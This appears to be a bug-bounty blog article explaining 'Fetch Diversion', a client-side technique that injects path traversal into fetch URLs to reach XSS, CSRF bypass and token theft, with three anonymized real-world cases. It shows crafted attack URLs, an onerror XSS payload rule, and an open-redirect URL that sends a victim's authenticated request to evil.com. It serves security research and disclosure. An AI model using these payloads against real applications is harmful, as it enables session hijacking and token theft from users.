---
layout: article
title: "Fetch Diversion"
image: /assets/fetch-diversion/cover.jpg
categories: bug-bounty
tags: [bug bounty, client-side, fetch diversion, xss]
assets: /assets/fetch-diversion/
---

*API calls and requests for resources can sometimes be diverted toward a
different endpoint on the same host, potentially resulting in DOM XSS's that
would otherwise be impossible to trigger, or other types of client-side
vulnerabilities.*

<!--more-->

![Traffic sign showing "Diverted traffic"]({{page.assets}}cover.png)

## Diverting fetch requests

Modern web applications commonly consist of a single web page that sends
requests to an API. Sometimes in the process, elements from the browser's
address bar, like query parameters or fragment parameters, are injected into
the path segment of the API's URL. For example, when the

```escape
https://app.target.com/users?id=<!123456!>
```

or

```escape
https://app.target.com/#/users/<!123456!>/profile
```

URL is visited, the application might send a `GET` request to

```escape
https://api.target.com/v2/users/<!123456!>/profile
```

in order to fetch the profile data of user 123456 and inject it into the DOM.

What would happen if instead of `123456`, we used something like
`../malicious/path` for the user id? If we're lucky and the client-side code
isn't too picky about what constitutes a valid user id, we might find that the
API call gets sent to `https://api.target.com/v2/malicious/path/profile`
instead.

What's happening here is that the client-side javascript forms the
`https://api.target.com/v2/users/../malicious/path/profile` URL and uses it in
a fetch request. The browser then normalizes the URL before sending the
request, which results in the `..` eating the `users` path component. Some
other normalization that the browser does include removing unnecessary `/./`
and converting `\` into `/`.

Note that parameters are almost always URL-decoded at least once before being
injected, which plays to our advantage. This is not part of URL normalization
though; this is done by the client-side javascript, most often by the front-end
framework. Sometimes the client-side javascript will do more processing, like
removing `%0A` and `%09`, which can be used to bypass WAFs that might block
`%2E%2E%2F`.

Now we only have to get rid of the trailing `/profile` and request can be
diverted toward any endpoint on `api.target.com`. It can usually be done by
adding a `?` or a `#`, URL-encoded if needed, at the end of the injected
parameter. So in the end we could could make our victim visit 

```escape
https://app.target.com/users?id=<!../malicious/path%23!>
```

or

```escape
https://app.target.com/#/users/<!..%2Fmalicious%2Fpath%23!>/profile
```

and have the application make its API call to

```escape
https://api.target.com/v2/users/<!../malicious/path#!>/profile
```

which would normalize to

```escape
https://api.target.com/v2/<!malicious/path!>
```

Of course API calls are not the only type of requests we can divert.
Applications may fetch all kinds of resources from their server, usually in the
form of a json file. One that is particularly interesting is translation files,
as we'll see in our [first real-world example](#case-1).

## Exploitation

### DOM XSS with uploaded file

If the application allows file uploads, and if the uploaded file can be
retrieved on a endpoint that can be reached with a Fetch Diversion, then we can
control the response to any request we are able to divert. It can result in an
XSS if a property from the response is inserted into the DOM in an insecure
way.

The great thing with this technique is that the `Content-Type` used to serve
the uploaded file doesn't matter. Normally an uploaded file that is returned as
`image/png` or `application/octet-stream`, for example, cannot be used directly
for XSS, because browsers will only allow script execution from [a few select
types](https://github.com/BlackFan/content-type-research/blob/master/XSS.md){:target="_blank"}
like `text/html`, `image/svg+xml` or `text/xml`. However, since the application
is making a simple fetch, it will happily treat the response as whatever it
expects (usually `application/json`), irrespective of its stated
`Content-Type`.

Similarly, response headers like `Content-Disposition: attachment`, won't
prevent our forged response from being interpreted.

Unfortunately, even when we're able to divert calls and upload files, there are
a few additional requisites before it can be exploited for a DOM XSS:

1. We need to be able to upload a file with arbitrary content, which will be
   served unmodified. If the back-end checks the content of the file or tries
   to process it in any way (image transcoding for example), it probably won't
   be exploitable.

2. The uploaded file must be accessible on the host toward which requests can
   be diverted. If, for example, the file is served directly from the CDN it's
   uploaded to, we probably won't be able to exploit it.

3. The uploaded file must be accessible by someone else, or else we would just
   end up with a self-XSS

4. There need to be a DOM XSS using one of the attributes returned by one of
   the requests we can divert

A common place for exploitation is in profile pictures, which also often have
the advantage of being publicly accessible. Our [second real-world
example](#case-2) is an illustration of this.

### Making authenticated requests

Applications that use a custom header (like `Authorization` or `X-CSRF-Token`)
or require `Content-Type: application/json` are normally immune to CSRF
(barring CORS misconfiguration). But since we're diverting a legitimate call
issued by the application itself, we're gaining the ability to make calls with
our victim's headers.

Keep in mind though that only the path and query parameters can be controlled.
We will have to do with whatever method and body the diverted request happens
to have. Most of the time it will only be `GET` requests, because it's unlikely
that a website will issue other types of requests on its own in response to a
navigation event. It's not unheard of though, as our [third real-world
example](#case-3) shows.

Still, if we can find an API that can change data based on query parameters,
then we might be able to exploit it. A great example is GraphQL, which
sometimes allows mutations through `GET` requests. If this is the case, then we
might be able to perform mutations as our victim by making them visit a URL
like this:

```escape
https://app.target.com/users?id=<!../../graphql%3Fquery%3D{mutation ...}!>
```

Sometimes `POST` requests will take their parameters from the URL if those
parameters cannot be found in the body. When this is the case and if we're able
to divert a `POST` request then it most likely can be exploited, since it's
unlikely the original endpoint and the endpoint we're diverting to both expect
the same parameters.

### Stealing access tokens

This is a theoretical exploit that I've never encountered in the real world.

Imagine the application uses a custom header for authorization (as opposed to
cookies), and we have an open redirect (the HTTP kind) on the host towards
which requests can be diverted. Then we would be able to send requests to our
own server, and those requests will contain our victim's token. For example,
visiting the following URL:

```escape
https://app.target.com/users?id=<!../../path/to/open/redirect%3Furl%3D%2F%2Fevil.com!>
```

will send an authenticated request to:

```escape
https://api.target.com/<!path/to/open/redirect?url=//evil.com!>
```

and this request, headers included, will be redirected to `https://evil.com`.


## Real-world examples

Despite the attack having quite a few requisites, I've been able to
successfully exploit it on a multiple occasions. Since they were all on private
programs, I'll remain somewhat vague and change all URLs that would be
identifiable.

### Case 1: XSS in translation file
{: #case-1}

The target was a web application for secure sharing of documents within an
organization. Documents of all kinds could be uploaded, and one of the feature
was sharing a preview of a document with co-workers. A preview which, in the
case of a text file, was just the file itself. The name of the preview file was
a randomly generated UUID.

The application also had an integrated web editor. This web editor used
angular-translate for i18n, and the locale could be set through the `locale`
query parameter. The translation file was loaded from

```escape
https://app.target.com/i18n/locale-<!<locale>!>.json
```

where `<locale>` was the value of the `locale` query parameter. One
particularity is that the locale had to start with `en-` (or any other
supported language), or angular-translate would error out and skip loading the
translations.

All you had to do was upload a malicious json document that would add an XSS
payload to the translation of the appropriate message, share it with your team,
and make one of your team members visit:

```escape
https://app.target.com/path/to/web_editor?lang=<!en-/../../path/to/preview/uuid?!>
```

It would make the application load its messages from:

```escape
https://app.target.com/i18n/locale-<!en-/../../path/to/preview/uuid?!>.json
```

which would normalize to the malicious preview file:

```escape
https://app.target.com/<!path/to/preview/uuid?!>.json
```

While the file was being loaded, the web editor would conveniently display
status messages using the very unsafe `innerHTML`, resulting in a DOM XSS.

### Case 2: XSS in API call
{: #case-2}

On this web application, users were able to upload an avatar for their profile.
Avatars were publicly accessible, even to unregistered users.

The client-side code would only allow the upload of valid image files, mostly
because it was using an editor to offer the user the possibility to crop their
image before upload. You could however upload arbitrary content manually, and
the file was made available completely unchanged. XSS with an html or svg file
was impossible though, because all avatars were served with a `Content-Type:
application/binary` header (which makes the browser download the file, instead
of displaying it).

Avatars were uploaded to an S3 bucket that was using a generic
`*.s3.amazonaws.com` hostname, but interestingly the bucket didn't allow any
type of public access. Instead, avatars were made accessible through an API
that was (presumably) proxying requests to the AWS bucket. This was perfect for
our purpose.

The application was using vue.js, and client-side routing was done using the
path in the URL fragment. For example,

```escape
https://app.target.com/#/projects/<!123456!>
```

would make an API call to

```escape
https://app.target.com/v2/projects/<!123456!>
```

There were multiple routes similar to this one, where the object id could be
used to divert API calls toward a malicious avatar file.

#### Finding exploitable API calls

The first issue was that most of them could not be be exploited for a DOM XSS.
When properties were inserted into the DOM, it was done in a safe way. I used
Burp's "Match and Replace" to inject an XSS payload in all the json values
returned by those API calls, and finally detected a few properties that were
inserted in an insecure way. The Match and Replace was simple but effective:

* Match in response body: `"([^"]*)":"`
* Replace: ``"$1":"<img src onerror=\\"console.log(`XSS on \${origin} using $1`)\\">``

#### Getting through multiple API calls

The second issue was that the only interesting URL I managed to identify was
making multiple API calls, and the call that returned the exploitable
properties was only the 3<sup>rd</sup> call being made. The normal flow would
look like:

* User visits `https://app.target.com/#/projects/123456/obj1`
   1. App calls `https://app.target.com/v2/projects/123456`, receiving a `project`
   2. App calls `https://app.target.com/v2/projects/123456/obj2`, receiving an `obj2`
   3. App calls `https://app.target.com/v2/projects/123456/obj3`, receiving an `obj3`<br>↳ this is the response that can be exploited for a DOM XSS

With a Fetch Diversion using the project id, the flow would now be:

* User visits `https://app.target.com/#/projects/..%2F..%2Fuploads%2Fevil.png%23/obj1`
   1. App calls `https://app.target.com/uploads/evil.png`, expecting a `project`, receiving an `obj3` ⚠
   2. App calls `https://app.target.com/uploads/evil.png`, expecting an `obj2`, receiving an `obj3` ⚠
   3. App calls `https://app.target.com/uploads/evil.png`, expecting an `obj3`, receiving an `obj3`

And the flow would in fact stop with an error on the 1<sup>st</sup> API call,
because the expected properties were missing from the response.

This is a fundamental limitation of Fetch Diversion: all requests that are
diverted using the same parameter, are diverted toward the same endpoint. They
will all see the same response, but they are are expecting different objects.
The application may error out before even sending the request that could be
exploited for XSS.

In this case, I was able to work around this issue by adding the properties
expected by the 1<sup>st</sup> API call, to the json object I was storing in my
avatar as the intended response to the 3<sup>rd</sup> API call. That was
enought to keep the application happy.

I won't get into the details of the 2<sup>nd</sup> API call, but I was
*extremely* lucky. There was another Path Diversion that was possible there,
and I was able to divert this call toward a 2<sup>nd</sup> avatar that would
contain a suitable response.

With all this, the app proceeded with the 3<sup>rd</sup> call and I was able to
trigger a DOM XSS that could target any user, in any organization.

### Case 3: Diverting a POST request to bypass CSRF protection
{: #case-3}

This web application was using a cookie with `SameSite=None` for authorization.
CSRF was out of the question though, because all API calls were protected
through the use of a custom header.

One of the pages was using some custom code that was extracting the `id` query
parameter from the URL, checking that it looked like a UUID, and then injecting
it inside the path of an API call. But all values that *started* like a UUID
were accepted.  As a result, visiting a URL such as:

```escape
https://app.target.com/vulnerable/page?id=<!xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/../../../target?!>
```

would send a `POST` request to:

```escape
https://app.target.com/api/endpoint/<!xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/../../../target?!>some/action
```

which would be normalized as:

```escape
https://app.target.com/<!target?!>some/action
```

Being generated by the application, the request of course contained the user's
anti-CSRF header (in addition to their authorization cookie).

There were a few actions that were possible through a POST request, that didn't
care what the body was. The attack was able to trigger those actions as the
victim, but none of them were extremely impactful.

There was a *very* fortunate (for the program) and probably unintentional
behavior in the piece of code that extracted the `id` from the URL, that made
it impossible to add query parameters to the diverted POST request. It turned
out to be *very* unfortunate for me, because the API had an endpoint that
allowed the user to upload an sftp key with a POST request. This particular
post request was taking its parameters (including the base64-encoded key to
upload) from the query parameters when they were not present in the body. Were
it not for this parsing peculiarity, an unauthenticated attacker would have
been able to use the Fetch Diversion to upload their sftp key and gain
read/write/create/delete access to the victim's files.

---
